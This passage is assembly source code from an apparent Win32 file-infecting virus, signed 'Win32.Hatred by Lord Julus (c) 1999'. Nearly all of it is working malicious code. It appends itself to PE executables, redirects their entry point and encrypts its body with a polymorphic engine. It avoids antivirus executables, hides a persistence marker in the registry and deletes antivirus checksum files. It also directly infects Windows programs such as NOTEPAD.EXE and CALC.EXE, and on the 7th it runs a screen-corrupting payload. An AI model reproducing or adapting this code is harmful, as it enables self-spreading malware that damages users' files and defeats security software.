       cmp word ptr [esi], 'ZM'           ; is it a MZ EXE file?
       jne unmap_view                     ;
       mov esi, dword ptr [esi.MZ_lfanew] ; get PE header offset
       cmp esi, 1000h                     ; too far?
       ja unmap_view                      ;
       add esi, [ebp+mapaddress]          ; save map address
       cmp word ptr [esi], 'EP'           ; is it a PE file?
       jne unmap_view                     ;
                                          ;
       mov dword ptr [ebp+PEheader], esi  ; save PE header place
       add esi, IMAGE_FILE_HEADER_SIZE    ; go to Optional header
                                          ;
       cmp word ptr [esi.OH_Win32VersionValue], 'H8' ; already infected?
       je unmap_view                      ;
                                          ;
       call InfectFile                    ; infect, please!
       jc don_t_mark                      ;
                                          ;
       dec [ebp+files]                    ; decrease infected files
                                          ;
       mov word ptr [esi.OH_Win32VersionValue], 'H8' ; mark infection
                                          ;
don_t_mark:                               ;
unmap_view:                               ;
       mov eax, [ebp+mapaddress]          ;
       push eax                           ; unmap the view
       call [ebp+_UnmapViewOfFile]        ;
                                          ;
close_map:                                ;
        mov eax, [ebp+maphandle]          ;
        push eax                          ; close the map
        call [ebp+_CloseHandle]           ;
                                          ;
close_file:                               ;
       push 0                             ; first we must set the file
       push 0                             ; pointer at the end of file
       push dword ptr [ebp+offset filesize];
       push dword ptr [ebp+offset handle1];
       call [ebp+_SetFilePointer]         ;
                                          ;
       push dword ptr [ebp+offset handle1]; ...and then mark the end of
       call [ebp+_SetEndOfFile]           ; file...
                                          ;
       lea ebx, [ebp+offset FileTime]     ; restore the file time
       push ebx                           ;
       add ebx, 8                         ;
       push ebx                           ;
       add ebx, 8                         ;
       push ebx                           ;
       push dword ptr [ebp+offset handle1];
       call dword ptr [ebp+_SetFileTime]  ;
                                          ;
       mov eax, [ebp+handle1]             ;
       push eax                           ; close the file...
       call [ebp+_CloseHandle]            ;
                                          ;
       push dword ptr [ebp+offset fileattributes] ; restore the file attribs
       push dword ptr [ebp+offset fileofs];
       call [ebp+_SetFileAttributes]      ;
                                          ;
next_file_exit:                           ;
       popad                              ; restore registers and exit
       ret                                ;
OpenFile endp                             ;

;??????????????????????????????????????????????????????????????????????????
;? Infect opened file                                                     ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  ESI = pointer to the file map

InfectFile proc near
     pushad                                         ;
     mov eax, dword ptr [esi.OH_FileAlignment]      ; save all the needed
     mov dword ptr [ebp+filealign], eax             ; values
     mov eax, dword ptr [esi.OH_SectionAlignment]   ;
     mov dword ptr [ebp+sectionalign], eax          ;
     mov eax, dword ptr [esi.OH_AddressOfEntryPoint];
     mov dword ptr [ebp+oldeip], eax                ;
     mov eax, dword ptr [esi.OH_ImageBase]          ;
     mov dword ptr [ebp+newimagebase], eax          ;
                                                    ;
     mov ebx, dword ptr [esi.OH_NumberOfRvaAndSizes]; let us locate the
     shl ebx, 3                                     ; last section
     xor eax, eax                                   ;
     mov ax, word ptr [esi.NumberOfSections-IMAGE_FILE_HEADER_SIZE]
     dec eax                                        ;
     mov ecx, IMAGE_SECTION_HEADER_SIZE             ;
     mul ecx                                        ;
                                                    ;
     mov esi, dword ptr [ebp+PEheader]              ; PE header offset +
     add esi, IMAGE_FILE_HEADER_SIZE                ; header length +
     add esi, 60h                                   ; optional header len +
     add esi, ebx                                   ; + data directory
     add esi, eax                                   ; + all sections
                                                    ;
     mov [ebp+lastsection], esi                     ; save last section addr
     mov edi, dword ptr [esi.SH_PointerToRawData]   ; get pointer to raw data
     add edi, dword ptr [ebp+mapaddress]            ; and align it to memory
     add edi, dword ptr [esi.SH_VirtualSize]        ; and then add virtual
     mov [ebp+smth], edi                            ; size and save the value
                                                    ;
     pushad                                         ; let us copy our virus
     lea esi, dword ptr [ebp+start]                 ; there...
     mov ecx, virussize                             ;
     rep movsb                                      ;
     popad                                          ;
                                                    ;
     add dword ptr [esi.SH_VirtualSize], virussize  ; increase the sizes
     add dword ptr [esi.SH_SizeOfRawData], virussize; (virtual and physical)
     or dword ptr [esi.SH_Characteristics], 0C0000040h; make section R/W
                                                    ;
     mov eax, [esi.SH_SizeOfRawData]                ; align SizeOfRawData
     mov ecx, dword ptr [ebp+filealign]             ; to the file
     push eax                                       ; alignment
     push ecx                                       ;
     xor edx, edx                                   ;
     div ecx                                        ;
     pop ecx                                        ;
     sub ecx, edx                                   ;
     pop eax                                        ;
     add eax, ecx                                   ;
     mov dword ptr [esi.SH_SizeOfRawData], eax      ; and store it
                                                    ;
     mov esi, dword ptr [ebp+PEheader]              ;
     mov eax, dword ptr [esi+50h]                   ; Get OldSizeOfImage
     add eax, virussize                             ; increase it and then
     mov ecx, dword ptr [ebp+sectionalign]          ; align it to the section
     push eax                                       ; alignment
     push ecx                                       ;
     xor edx, edx                                   ;
     div ecx                                        ;
     pop ecx                                        ;
     sub ecx, edx                                   ;
     pop eax                                        ;
     add eax, ecx                                   ;
     mov dword ptr [esi+50h], eax                   ;
                                                    ;
     mov edi, [ebp+lastsection]                     ; point last section
                                                    ;
     mov eax, [edi.SH_PointerToRawData]             ; Pointer to raw data
     add eax, [edi.SH_VirtualSize]                  ; plus last section size
     mov [ebp+filesize], eax                        ; is the filesize. Align
     mov ecx, dword ptr [ebp+filealign]             ; it to the file
     push eax                                       ; alignment
     push ecx                                       ;
     xor edx, edx                                   ;
     div ecx                                        ;
     pop ecx                                        ;
     sub ecx, edx                                   ;
     pop eax                                        ;
     add eax, ecx                                   ;
     mov dword ptr [ebp+filesize], eax              ; and store it
                                                    ;
     mov eax, [edi.SH_VirtualAddress]               ; let us locate the new
     add eax, [edi.SH_VirtualSize]                  ; EIP...
     sub eax, virussize                             ;
     mov dword ptr [esi+28h], eax                   ; ...and store it!!

; we finished infecting the file. Now let us prepare to call the poly
; engine:

     mov ebx, eax                                ; EBX = code to decrypt at
     add ebx, [ebp+imagebase]                    ;       runtime
     add ebx, offset start_of_code-offset start  ;       (adjustment)
     mov esi, dword ptr [ebp+smth]               ; ESI = code to encrypt in
     add esi, offset start_of_code-offset start  ;       memory
     mov edi, esi                                ; EDI = where to place the
     add edi, offset decrypt-offset start_of_code;       decryptor
     mov ecx, end_of_code-start_of_code          ; ECX = size of code to crypt
     shr ecx, 2                                  ; be sure is divisible by
     shl ecx, 2                                  ; 4
                                                 ;
     Call MOF32                                  ; Call MOF32
                                                 ;
     mov edi, [ebp+the_end]                      ; go to the end
     sub esi, edi                                ; and store a JMP there...
     mov al, 0E9h                                ;
     stosb                                       ;
     mov eax, esi                                ; a jmp to the beginning of
     sub eax, 5                                  ; the real code
     stosd                                       ;
                                                 ;
     mov ecx, dword ptr [ebp+offset filesize]    ; put zeroes until the end
     add ecx, [ebp+mapaddress]                   ; of file so no mess is
     sub ecx, edi                                ; found there (the mess
     mov edi, [ebp+end_end]                      ;
     mov al, 0                                   ; which remains is because
     rep stosb                                   ; of the alignment)
     popad                                       ; restore registers
                                                 ;
     mov edi, dword ptr [ebp+smth]               ; mutate initial jump
     add edi, offset jump_code-offset start      ;
     mov eax, dword ptr [ebp+first_intend]       ; with the first intend
     add dword ptr [edi+1], eax                  ;
     ret                                         ;
InfectFile endp                                  ;

;??????????????????????????????????????????????????????????????????????????
;? Check if the file is good for infection                                ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:      = pointer to filename
;
; Return: CF clear if file is ok
;         CF set if file cannot be infected


ValidateFile proc near                           ;
       pushad                                    ;
                                                 ;
       xchg esi, edi                             ;
       lea esi, [ebp+avoid_list]                 ; point avoid list
                                                 ;
repeat_check_files:                              ;
       push esi                                  ;
       call [ebp+_lstrlen]                       ; get length of string
       mov ecx, eax                              ;
                                                 ;
       push esi edi                              ;
       rep cmpsb                                 ; compare string
       je file_invalid                           ;
       pop edi esi                               ;
       add esi, eax                              ; go to the next name
       inc esi                                   ;
       cmp byte ptr [esi], 0FFh                  ; the end?
       je file_valid                             ;
       jmp repeat_check_files                    ;
                                                 ;
file_valid:                                      ;
       clc                                       ; file can be infected
       popad                                     ;
       ret                                       ;
                                                 ;
file_invalid:                                    ;
       pop edi ecx                               ;
       stc                                       ; file cannot be infected
       popad                                     ;
       ret                                       ;
ValidateFile endp                                ;
                                                 ;
avoid_list label                                 ;
           db 'TB'     ,0                        ;
           db 'F-'     ,0                        ;
           db 'AW'     ,0                        ;
           db 'AV'     ,0                        ;
           db 'NAV'    ,0                        ;
           db 'PAV'    ,0                        ;
           db 'RAV'    ,0                        ;
           db 'NVC'    ,0                        ;
           db 'FPR'    ,0                        ;
           db 'DSS'    ,0                        ;
           db 'IBM'    ,0                        ;
           db 'INOC'   ,0                        ;
           db 'ANTI'   ,0                        ;
           db 'SCN'    ,0                        ;
           db 'VSAF'   ,0                        ;
           db 'VSWP'   ,0                        ;
           db 'PANDA'  ,0                        ;
           db 'DRWEB'  ,0                        ;
           db 'FSAV'   ,0                        ;
           db 0FFh                               ;


;??????????????????????????????????????????????????????????????????????????
;? Retrieve or set the last checked directory from the registry           ?
;??????????????????????????????????????????????????????????????????????????
;
; Entry:  nothing
;
; Return: EDI = pointer to the directory

SetInitialKey proc near                             ;
       pushad                                       ;
                                                    ;
       lea eax, dword ptr [ebp+offset key_handle]   ; First let us open
       push eax                                     ; the key we have
       push KEY_ALL_ACCESS                          ; our value set up in
       push 0                                       ;
       lea eax, dword ptr [ebp+offset KEY]          ;
       push eax                                     ;
       push HKEY_CURRENT_USER                       ;
       call [ebp+_RegOpenKeyExA]                    ;
       cmp eax, 0                                   ;
       jne set_new_key                              ; if error -> create...
                                                    ;
       lea eax, dword ptr [ebp+offset key_len]      ; now, after the key is
       push eax                                     ; open, lets query our
       lea eax, dword ptr [ebp+offset key_data]     ; Hatred value...
       push eax                                     ;
       lea eax, dword ptr [ebp+offset key_type]     ;
       push eax                                     ;
       push 0                                       ;
       lea eax, dword ptr [ebp+key_name]            ;
       push eax                                     ;
       mov eax, dword ptr [ebp+key_handle]          ;
       push eax                                     ;
       call [ebp+_RegQueryValueExA]                 ;
       cmp eax, 0                                   ; if found, then it's ok
       je key_was_found                             ;
                                                    ;
       mov eax, dword ptr [ebp+key_handle]          ; close key handle
       push eax                                     ; (carefull!)
       call [ebp+_CloseHandle]                      ;
                                                    ;
set_new_key:                                        ; otherwise create key/val
       IF TESTONLY                                  ; if we must set a new
       ELSE                                         ; key then we should make
       call DirectInfect                            ; the direct infection
       ENDIF                                        ; now...
       mov [ebp+skip], 1                            ;
       lea eax, dword ptr [ebp+disposition]         ; new? or existing?
       push eax                                     ;
       lea eax, dword ptr [ebp+key_handle]          ; new key handle
       push eax                                     ;
       push 0                                       ; security attrib
       push KEY_ALL_ACCESS                          ; all access
       push REG_OPTION_NONVOLATILE                  ; don't destroy at reboot
       push 0                                       ; class
       push 0                                       ; reserved
       lea eax, dword ptr [ebp+KEY]                 ; ptr to new key name
       push eax                                     ;
       push HKEY_CURRENT_USER                       ; parent key
       call [ebp+_RegCreateKeyExA]                  ;
                                                    ;
       push 4                                       ; new value length
       lea eax, dword ptr [ebp+system_paths]        ; new value pointer
       call CryptKey                                ;
                                                    ;
subsequent_call:                                    ;
       push eax                                     ;
       push REG_SZ                                  ; make it string
       push 0                                       ; reserved
       lea eax, dword ptr [ebp+key_name]            ; key name for value
       push eax                                     ;
       mov eax, dword ptr [ebp+key_handle]          ;
       push eax                                     ; new key handle
       call [ebp+_RegSetValueExA]                   ;
       lea edi, dword ptr [ebp+system_paths]        ;
       mov eax, edi                                 ;
       call CryptKey                                ;
       jmp exit_registry                            ;
                                                    ;
key_was_found:                                      ;
       mov [ebp+skip], 0                            ;
       lea edi, dword ptr [ebp+key_data]            ;
       mov eax, edi                                 ;
       call CryptKey                                ; decrypt key
       push edi                                     ; is the found key
       call [ebp+_SetCurrentDirectoryA]             ; still a valid dir?
       or eax, eax                                  ;
       jz set_new_key                               ; if not reset...
                                                    ;
exit_registry:                                      ;
       mov eax, dword ptr [ebp+key_handle]          ; close this handle too
       push eax                                     ;
       call dword ptr [ebp+_CloseHandle]            ;
       mov dr0, edi                                 ;
       popad                                        ;
       mov edi, dr0                                 ; and return with edi
       ret                                          ; pointing the path
SetInitialKey endp                                  ;
                                                    ;
SetSubsequentKey proc near                          ;
       pushad                                       ;
       lea eax, [ebp+offset key_data]               ;
       push eax                                     ;
       push 260                                     ;
       call [ebp+_GetCurrentDirectoryA]             ; retrieve last checked
       lea eax, [ebp+offset key_data]               ; dir
       call CryptKey                                ; crypt it
       push 4                                       ;
       lea eax, [ebp+offset key_data]               ; and set it in the
       jmp subsequent_call                          ; registry
SetSubsequentKey endp                               ;
                                                    ;
CryptKey proc near  ; eax = address                 ; this crypts or decrypts
       push eax ecx                                 ; the key with a simple
       push eax                                     ; XOR algorithm. However
       push eax                                     ; using RegEdit you cannot
       call [ebp+_lstrlen]                          ; see the encrypted key.
       mov ecx, eax                                 ; Instead a bunch of
       pop eax                                      ; black squares will
crypt_key:                                          ; appear as our key's
       xor byte ptr [eax], 'H'                      ; value.
       inc eax                                      ;
       loop crypt_key                               ;
       pop ecx eax                                  ;
       ret                                          ;
CryptKey endp                                       ;
                                                    ;
HKEY_CURRENT_USER      EQU 80000001h                ; Where to create key
REG_SZ                 EQU 1                        ; Create String values
REG_OPTION_NONVOLATILE EQU 0                        ; Do not destroy at reboot
KEY_ALL_ACCESS         EQU 0F003FH                  ; all access
disposition dd 0                                    ; ...
key_handle  dd 0                                    ; values ret. by Create
KEY         db "Control Panel\Cursors", 0           ; new key
key_data    db 260 dup(0)                           ; new value
key_len     dd 260                                  ;
key_name    db "dertaH", 0                          ; key name
key_type    dd 0                                    ;

;??????????????????????????????????????????????????????????????????????????
;? Graphical Payload                                                      ?
;??????????????????????????????????????????????????????????????????????????

Payload proc near
       lea eax, [ebp+offset systime]          ; get the system time
       mov edi, eax                           ;
       push eax                               ;
       call [ebp+_GetSystemTime]              ;
       mov eax, dword ptr [edi+4]             ;
       and eax, 0FFFF0000h                    ;
       shr eax, 10h                           ; Eax = Day of Month...
       cmp eax, 7                             ; is it 7 ?
       jne no_payload                         ;
                                              ;
       push 1000h                             ; display a window
       lea eax, [ebp+wintitle]                ;
       push eax                               ;
       lea eax, [ebp+wintext]                 ;
       push eax                               ;
       push 0                                 ;
       call [ebp+_MessageBoxA]                ;
                                              ;
       xor eax, eax                           ; get screen device context
       push eax                               ;
       call [ebp+_GetDC]                      ;
       mov [ebp+screen], eax                  ;
                                              ;
loop_:                                        ;
       mov eax, 2000                          ; get a random X-axis place
       call brandom32                         ;
       mov [ebp+x], eax                       ;
       mov eax, 2000                          ; get a random Y-axis place
       call brandom32                         ;
       mov [ebp+y], eax                       ;
       push 0                                 ; erase area flag
       push [ebp+x]                           ;
       push [ebp+y]                           ;
       push [ebp+screen]                      ;
       push 1                                 ; area size
       push 1                                 ; area size
       inc [ebp+x]                            ;
       inc [ebp+y]                            ;
       push [ebp+x]                           ;
       push [ebp+y]                           ;
       push [ebp+screen]                      ;
       call [ebp+_BitBlt]                     ; do it...
                                              ;
       push 01bh                              ; check if ESC was pressed...
       call [ebp+_GetAsyncKeyState]           ;
       or eax, eax                            ;
       jne finish                             ;
       jmp loop_                              ;
                                              ;
finish:                                       ;
no_payload:                                   ;
       ret                                    ;

wintitle db "Win32.Hatred by Lord Julus (c) 1999", 0
wintext  db 13, 10, 13, 10
         db "Today is the 7th !! Today is the day of hate !!"
         db 13, 10, 13, 10
         db "With Heart feel Hatred ! Black blood runs thru my veins !"
         db 13, 10, 13, 10
         db "Hatred !!!! Hatred !!!!"
         db 13, 10, 13, 10
         db "(escape is your escape)"
         db 13, 10, 0
x        dd 0
y        dd 0
screen   dd 0
systime  dd 0
Payload endp

;??????????????????????????????????????????????????????????????????????????
;? Erase Checksum Files                                                   ?
;??????????????????????????????????????????????????????????????????????????

EraseChecksums proc near                     ;
      pushad                                 ;
      lea edi, [ebp+offset searchfiles]      ; point to Search Record
      lea esi, [ebp+offset av_list]          ; point av files list
                                             ;
locate_next_av:                              ;
      cmp byte ptr [esi], 0FFh               ;
      je av_kill_done                        ;
      mov eax, esi                           ;
      cmp byte ptr [eax], 0FFh               ; is this the end?
      je av_kill_done                        ;
      push edi                               ; push search record address
      push eax                               ; push filename address
      call [ebp+_FindFirstFileA]             ; find first match
      cmp eax, 0FFFFFFFFh                    ; check for EAX = -1
      je next_av_file                        ;
      push eax                               ;
      lea ebx, [edi.FileName]                ; ESI = pointer to filename...
      push ebx                               ; push filename address
      call [ebp+_DeleteFileA]                ; delete file!
                                             ;
      call [ebp+_FindClose]                  ; close the find handle
                                             ;
next_av_file:                                ;
      push edi                               ;
      mov edi, esi                           ;
      mov al, 0                              ;
      mov ecx, 100                           ;
      repnz scasb                            ;
      mov esi, edi                           ;
      pop edi                                ;
      jmp locate_next_av                     ;
                                             ;
av_kill_done:                                ;
      popad                                  ;
      ret                                    ;
EraseChecksums endp                          ;
                                             ;
av_list          db "AVP.CRC"     , 0        ; the av files to kill
                 db "IVP.NTZ"     , 0        ;
                 db "Anti-Vir.DAT", 0        ;
                 db "CHKList.MS"  , 0        ;
                 db "CHKList.CPS" , 0        ;
                 db "SmartCHK.MS" , 0        ;
                 db "SmartCHK.CPS", 0        ;
                 db 0FFh                     ;

;??????????????????????????????????????????????????????????????????????????
;? Direct Infect Routine                                                  ?
;??????????????????????????????????????????????????????????????????????????

DirectInfect proc near                       ; direct ass-kick
       pushad                                ;
                                             ;
       lea esi, [ebp+tempdir]                ;
       push 260                              ;
       push esi                              ;
       call [ebp+_GetWindowsDirectoryA]      ; find Windows dir
                                             ;
       or eax, eax                           ;
       jz quit                               ;
                                             ;
       push esi                              ;
       call [ebp+_SetCurrentDirectoryA]      ; change to it...
                                             ;
       lea esi, [ebp+direct_list]            ; take the files...
                                             ;
direct_loop:                                 ;
       call OpenFile                         ; open & infect
       mov edi, esi                          ;
       mov al, 0                             ;
       mov ecx, 100                          ;
       repnz scasb                           ; next file
       cmp byte ptr [edi], 0FFh              ;
       je quit                               ;
       mov esi, edi                          ;
       jmp direct_loop                       ;
                                             ;
quit:                                        ;
       popad                                 ;
       ret                                   ;
DirectInfect endp                            ;
                                             ;
IF DEBUG                                     ;
direct_list label                            ;
        db 'CDPLAYER.XEX', 0                 ;
        db 'CALC.XEX'    , 0                 ;
        db 'PBRUSH.XEX'  , 0                 ;
        db 'MPLAYER.XEX' , 0                 ;
        db 'NOTEPAD.XEX' , 0                 ;
        db 'WINHLP32.XEX', 0                 ;
        db 0FFh                              ;
ELSE                                         ;
direct_list label                            ;
        db 'CDPLAYER.EXE', 0                 ;
        db 'CALC.EXE'    , 0                 ;
        db 'PBRUSH.EXE'  , 0                 ;
        db 'MPLAYER.EXE' , 0                 ;
        db 'NOTEPAD.EXE' , 0                 ;
        db 'WINHLP32.EXE', 0                 ;
        db 0FFh                              ;
ENDIF                                        ;

;??????????????????????????????????????????????????????????????????????????
;? Equates, structures, data                                              ?
;??????????????????????????????????????????????????????????????????????????

IMAGE_DOS_HEADER STRUC           ; DOS .EXE header
MZ_magic         DW ?            ; Magic number
MZ_cblp          DW ?            ; Bytes on last page of file
MZ_cp            DW ?            ; Pages in file
MZ_crlc          DW ?            ; Relocations
MZ_cparhdr       DW ?            ; Size of header in paragraphs
MZ_minalloc      DW ?            ; Minimum extra paragraphs needed
MZ_maxalloc      DW ?            ; Maximum extra paragraphs needed
MZ_ss            DW ?            ; Initial (relative) SS value
MZ_sp            DW ?            ; Initial SP value
MZ_csum          DW ?            ; Checksum
MZ_ip            DW ?            ; Initial IP value
MZ_cs            DW ?            ; Initial (relative) CS value
MZ_lfarlc        DW ?            ; File address of relocation table
MZ_ovno          DW ?            ; Overlay number
MZ_res           DW 4 DUP(?)     ; Reserved words
MZ_oemid         DW ?            ; OEM identifier (for MZ_oeminfo)
MZ_oeminfo       DW ?            ; OEM information; MZ_oemid specific
MZ_res2          DW 10 DUP(?)    ; Reserved words
MZ_lfanew        DD ?            ; File address of new exe header
IMAGE_DOS_HEADER ENDS            ;
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
                                 ;
IMAGE_FILE_HEADER STRUC          ; Portable Exe File
PE_Magic                 DD ?    ;
Machine                  DW ?    ; Machine type
NumberOfSections         DW ?    ; Number of sections
TimeDateStamp            DD ?    ; Date and Time
PointerToSymbolTable     DD ?    ; Pointer to Symbols
NumberOfSymbols          DD ?    ; Number of Symbols
SizeOfOptionalHeader     DW ?    ; Size of Optional Header
Characteristics          DW ?    ; File characteristics
IMAGE_FILE_HEADER ENDS           ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER
                                 ;
IMAGE_DATA_DIRECTORY STRUC       ; Image data directory
DD_VirtualAddress    DD ?        ; Virtual address
DD_Size              DD ?        ; Virtual size
IMAGE_DATA_DIRECTORY ENDS        ;;;;;;;;;
                                         ;
IMAGE_DIRECTORY_ENTRIES STRUC            ; All directories
DE_Export       IMAGE_DATA_DIRECTORY  ?  ;
DE_Import       IMAGE_DATA_DIRECTORY  ?  ;
DE_Resource     IMAGE_DATA_DIRECTORY  ?  ;
DE_Exception    IMAGE_DATA_DIRECTORY  ?  ;
DE_Security     IMAGE_DATA_DIRECTORY  ?  ;
DE_BaseReloc    IMAGE_DATA_DIRECTORY  ?  ;
DE_Debug        IMAGE_DATA_DIRECTORY  ?  ;
DE_Copyright    IMAGE_DATA_DIRECTORY  ?  ;
DE_GlobalPtr    IMAGE_DATA_DIRECTORY  ?  ;
DE_TLS          IMAGE_DATA_DIRECTORY  ?  ;
DE_LoadConfig   IMAGE_DATA_DIRECTORY  ?  ;
DE_BoundImport  IMAGE_DATA_DIRECTORY  ?  ;
DE_IAT          IMAGE_DATA_DIRECTORY  ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS             ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16    ;
                                         ;;;;;;;;;;;
IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
OH_Magic                        DW ?           ; Magic word
OH_MajorLinkerVersion           DB ?           ; Major Linker version
OH_MinorLinkerVersion           DB ?           ; Minor Linker version
OH_SizeOfCode                   DD ?           ; Size of code section
OH_SizeOfInitializedData        DD ?           ; Initialized Data
OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
OH_ImageBase                    DD BYTE PTR ?  ; Base of image
OH_SectionAlignment             DD ?           ; Section Alignment
OH_FileAlignment                DD ?           ; File Alignment
OH_MajorOperatingSystemVersion  DW ?           ; Major OS
OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
OH_MajorImageVersion            DW ?           ; Major Image version
OH_MinorImageVersion            DW ?           ; Minor Image version
OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
OH_Win32VersionValue            DD ?           ; win32 version
OH_SizeOfImage                  DD ?           ; Size of image
OH_SizeOfHeaders                DD ?           ; Size of Header
OH_CheckSum                     DD ?           ; unused
OH_Subsystem                    DW ?           ; Subsystem
OH_DllCharacteristics           DW ?           ; DLL characteristic
OH_SizeOfStackReserve           DD ?           ; Stack reserve
OH_SizeOfStackCommit            DD ?           ; Stack commit
OH_SizeOfHeapReserve            DD ?           ; Heap reserve
OH_SizeOfHeapCommit             DD ?           ; Heap commit
OH_LoaderFlags                  DD ?           ; Loader flags
OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                UNION          ; directory entries
OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                ENDS           ;
IMAGE_OPTIONAL_HEADER ENDS                     ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
                                               ;
IMAGE_SECTION_HEADER STRUC                     ; Section hdr.
SH_Name                 DB 8 DUP(?)            ; name
                        UNION                  ;
SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
SH_VirtualSize          DD ?                   ; Virtual size
                        ENDS                   ;
SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
SH_SizeOfRawData        DD ?                   ; Raw data size
SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
SH_PointerToRelocations DD BYTE PTR ?          ; ...
SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
SH_NumberOfRelocations  DW ?                   ; ....
SH_NumberOfLinenumbers  DW ?                   ; ..
SH_Characteristics      DD ?                   ; flags
IMAGE_SECTION_HEADER ENDS                      ;
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER
                                            ;
IMAGE_IMPORT_BY_NAME STRUC                  ; Import by name data type
IBN_Hint DW 0                               ; Hint entry
IBN_Name DB 1 DUP (?)                       ; name
IMAGE_IMPORT_BY_NAME ENDS                   ;
                                            ;
IMAGE_THUNK_DATA STRUC                      ; Thunk data
                    UNION                   ;
TD_AddressOfData    DD IMAGE_IMPORT_BY_NAME PTR ? ; Ptr to IMAGE_IMPORT_BY_NAME structure
TD_Ordinal          DD ?                    ; Ordinal ORed with IMAGE_ORDINAL_FLAG
TD_Function         DD BYTE PTR ?           ; Ptr to function (i.e. Function address after program load)
TD_ForwarderString  DD BYTE PTR ?           ; Ptr to a forwarded API function.
                    ENDS                    ;
IMAGE_THUNK_DATA ENDS               ;;;;;;;;;
                                    ;
IMAGE_IMPORT_DESCRIPTOR STRUC       ; Import descryptor
                      UNION         ;
ID_Characteristics    DD ?          ; 0 for last null import descriptor
ID_OriginalFirstThunk DD IMAGE_THUNK_DATA PTR ? ; RVA to original unbound IAT
                      ENDS          ;
ID_TimeDateStamp      DD ?          ;
ID_ForwarderChain     DD ?          ; -1 if no forwarders
ID_Name               DD BYTE PTR ? ; RVA to name of imported DLL
ID_FirstThunk         DD IMAGE_THUNK_DATA PTR ?  ; RVA to IAT
IMAGE_IMPORT_DESCRIPTOR ENDS        ;
IMAGE_IMPORT_DESCRIPTOR_SIZE = SIZE IMAGE_IMPORT_DESCRIPTOR

IMAGE_EXPORT_DIRECTORY STRUC                ; Export Directory type
ED_Characteristics        DD ?              ; Flags
ED_TimeDateStamp          DD ?              ; Date / Time
ED_MajorVersion           DW ?              ; Major version
ED_MinorVersion           DW ?              ; Minor version
ED_Name                   DD    BYTE PTR ?  ; Ptr to name of exported DLL
                          UNION             ;
ED_Base                   DD    ?           ; base
ED_BaseOrdinal            DD    ?           ; base ordinal
                          ENDS              ;
ED_NumberOfFunctions      DD    ?           ; number of exported funcs.
                          UNION             ;
ED_NumberOfNames          DD    ?           ; number of exported names
ED_NumberOfOrdinals       DD    ?           ; number of exported ordinals
                          ENDS              ;
ED_AddressOfFunctions     DD    DWORD PTR ? ; Ptr to array of function addresses
ED_AddressOfNames         DD    DWORD PTR ? ; Ptr to array of (function) name addresses
                          UNION             ;
ED_AddressOfNameOrdinals  DD    WORD PTR ?  ; Ptr to array of name ordinals
ED_AddressOfOrdinals      DD    WORD PTR ?  ; Ptr to array of ordinals
                          ENDS              ;
IMAGE_EXPORT_DIRECTORY ENDS                 ;

filetime                STRUC             ; filetime structure
FT_dwLowDateTime        dd ?              ;
FT_dwHighDateTime       dd ?              ;
filetime                ENDS              ;
                                          ;
win32_find_data         STRUC             ;
FileAttributes          dd ?              ; attributes
CreationTime            filetime ?        ; time of creation
LastAccessTime          filetime ?        ; last access time
LastWriteTime           filetime ?        ; last modificationm
FileSizeHigh            dd ?              ; filesize
FileSizeLow             dd ?              ; -"-
Reserved0               dd ?              ;
Reserved1_              dd ?              ;
FileName                db 260 dup (?)    ; long filename
AlternateFileName       db 13 dup (?)     ; short filename
                        db 3 dup (?)      ; dword padding
win32_find_data         ENDS              ;

MAX_PATH                = 260

k32                             dd 0
kernel32_name                   db "Kernel32.DLL", 0
advapi32_name                   db "ADVAPI32.dll", 0
user32_name                     db "USER32.dll", 0
gdi32_name                      db "GDI32.dll", 0
newimagebase                    label
imagebase                       dd 00400000h
getmodulehandle                 db "GetModuleHandleA"
getmodulehandlelen              =  $-offset getmodulehandle
getprocaddress                  db "GetProcAddress", 0
getprocaddresslen               =  $-offset getprocaddress
scanneddirs                     dd 0
searchrec                          win32_find_data 
searchfiles                        win32_find_data 
handle                          dd 0
handle1                         dd 0
maphandle                       dd 0
searchhandle                    dd 0
signal                          dd 0
files                           dd 0
mapaddress                      dd 0
filesize                        dd 0
skip                            db 0
curdir                          db 260 dup (0)
tempdir                         db 260 dup (0)
FileTime                        dq 0, 0, 0
virussize                       equ end-start
filealign                       dd 0
sectionalign                    dd 0
oldeip                          dd 0
PEheader                        dd 0
lastsection                     dd 0
deltahandle                     dd 0
smth                            dd 0
fileofs                         dd 0
fileattributes                  dd 0

;------------------- Kernel32 APIS

k32_API_names label
                                db "GetModuleHandleA",0
                                db "ExitProcess", 0
                                db "GlobalAlloc", 0
                                db "GlobalFree", 0
                                db "GetWindowsDirectoryA", 0
                                db "GetSystemDirectoryA", 0
                                db "GetCurrentDirectoryA", 0
                                db "SetCurrentDirectoryA", 0
                                db "FindFirstFileA", 0
                                db "FindNextFileA", 0
                                db "GetDriveTypeA", 0
                                db "CloseHandle", 0
                                db "FindClose", 0
                                db "CreateFileA", 0
                                db "CreateFileMappingA", 0
                                db "MapViewOfFile", 0
                                db "UnmapViewOfFile", 0
                                db "SetFilePointer", 0
                                db "SetEndOfFile", 0
                                db "GetFileSize", 0
                                db "lstrlen", 0
                                db "SetFileTime", 0
                                db "GetFileTime", 0
                                db "GetProcAddress", 0
                                db "FlushViewOfFile", 0
                                db "GetLastError", 0
                                db "GetSystemTime", 0
